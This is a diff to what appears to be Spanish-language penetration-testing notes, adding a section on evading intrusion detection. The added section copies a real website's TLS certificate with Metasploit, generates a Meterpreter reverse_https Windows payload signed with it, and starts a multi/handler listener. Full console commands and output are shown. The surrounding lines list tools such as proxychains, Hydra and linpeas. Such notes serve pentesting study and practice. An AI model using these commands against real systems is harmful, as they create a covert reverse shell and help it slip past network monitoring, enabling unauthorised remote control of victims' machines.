@@ -653,7 +653,37 @@ $ script -qc /bin/bash /dev/null
 		2. Una vez con eso hecho, vamos al fichero `/etc/proxychains.conf` y añadimos una linea de que proxy usar (Ejemplo: `socks4 127.0.0.1 8080`)
 		3. Con el comando `proxychains` delante de cualquier comando podremos mandar dicho comando a traves de nuestro proxy
 	- Se podría crear un script para metasploit y agilizar procesos que se usen mucho `msfconsole -r resourcescript.rc`
-	- Un módulo muy útil es `auxiliary/gather/impersonate_ssl`, permite copiar un certificado TLS de un determinado sitio web para usarlo en otros módulos (Autofirmándolo) para evitar IDs/IPs
+	- Para evitar posibles IDs/IPs se puede hacer lo siguiente para evitar que Metasploit utilice su certificado TLS con el módulo `exploit/multi/handler` al usar payloads HTTPS:
+		1.  Usando `auxiliary/gather/impersonate_ssl` se copia un certificado TLS de un determinado sitio web
+		2. Ahora para generar el payload de Meterpreter los haremos desde la propia consola de Metasploit (La ruta al certificado TLS te la da el propio `auxiliary/gather/impersonate_ssl` al terminar):
+		   ```
+		   msf payload(reverse_http) > use payload/windows/meterpreter/reverse_https
+		   msf payload(reverse_https) > set stagerverifysslcert true
+		   stagerverifysslcert => true
+	       msf payload(reverse_https) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   msf payload(reverse_https) > set LHOST 10.0.2.15
+		   LHOST => 10.0.2.15
+		   msf payload(reverse_https) > set LPORT 8080
+		   LPORT => 8080
+		   msf payload(reverse_https) > generate -f exe -o /tmp/payload.exe
+		   [*] Writing 73802 bytes to /tmp/payload.exe...
+		   ```
+		3. Por último toca preparar el módulo `exploit/multi/handler`:
+		   ```
+		   msf payload(reverse_https) > use exploit/multi/handler 
+           msf exploit(handler) > set LHOST 10.0.2.15
+		   LHOST => 10.0.2.15
+		   msf exploit(handler) > set LPORT 8080
+		   LPORT => 8080
+		   msf exploit(handler) > set HANDLERSSLCERT /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   HANDLERSSLCERT => /home/kali/.msf4/loot/20220807124850_default_2.17.153.99_2.17.153.99_pem_696944.pem
+		   msf exploit(handler) > set stagerverifysslcert true
+		   stagerverifysslcert => true
+		   msf exploit(handler) > exploit -j
+
+		   [*] Exploit running as background job.
+		   ```
 - [**Armitage**](https://github.com/rsmudge/armitage)**:** GUI para metasploit
 - [**Hydra**](https://github.com/vanhauser-thc/thc-hydra)**:** Buscar contraseñas por fuerza bruta a tavés de un protocolo o web
 - [**linpeas/winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)**:** Saca info de la máquina para ver como escalar
